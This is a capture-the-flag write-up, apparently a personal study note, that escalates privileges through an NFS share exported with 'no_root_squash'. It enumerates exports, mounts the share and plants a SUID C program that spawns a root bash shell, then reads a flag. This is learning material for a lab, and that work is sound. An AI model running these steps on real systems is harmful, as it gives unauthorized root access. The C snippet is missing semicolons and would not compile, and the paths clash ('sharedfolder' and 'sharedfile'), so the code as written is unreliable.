# NFS

Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.



### How many mountable shares can you identify on the target system?

```bash
cat /etc/exports
```

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

We can identify 3 shares

### How many shares have the "no\_root\_squash" option enabled?

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

There are in total 3 shares with the "no\_root\_squash" option enabled

### What is the content of the flag7.txt file? 

To retrieve the content of the flag7.txt, we will explore the enabled option on **/home/ubuntu/sharedfolder**.

**Step 1: Enumerate mountable shares on the attack machine**

```bash
showmount -e <target IP>
```

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

**Step 2: Mount the /home/ubuntu/sharedfolder share on the attack machine**

```bash
mkdir /tmp/bckatkmch
mount -o rw <target IP>:/home/ubuntu/sharedfolder /tmp/bckatkmch
```

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

**Step 3: Create an executable to set the SUID bits**

Move to the **/tmp/bckatkmch** directory and create the a C executable. We will name it nfs.c.

```c
int main()
{ setgid(0)
  setuid(0)
  system("/bin/bash");
  return 0;
}
```

We then compile it and set the SUID bit.

```bash
gcc nfs.c -o nfs -w
chmod +s nfs
ls -l nfs
```

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

**Step 4: Execute the nfs script**

Now on the target machine move the **/home/ubuntu/sharedfile** directory and execute the `nfs` program.

```bash
id
whoami
ls -l
./nfs	
id
whoami
```

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

**Step 5: Retrieve the flag**

The flag7.txt is under **/home/matt**, if the previous steps were completed successfully we should be able to see the content of the flag.

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
